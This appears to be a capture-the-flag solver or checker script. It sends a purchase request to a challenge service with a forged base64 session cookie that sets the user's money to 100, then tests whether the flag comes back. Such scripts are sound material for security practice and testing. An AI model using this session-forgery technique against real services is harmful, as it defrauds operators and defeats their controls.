import requests
import urllib.parse

flag = input()
service = input()

response = requests.post(
    urllib.parse.urljoin(service, "buy"),
    cookies={
        "session": "eyJtb25leSI6IDEwMCwgImhpc3RvcnkiOiBbXX0="
    },
    data={"id": 2}
)

if flag in response.text:
    exit(0)
else:
    exit(1)
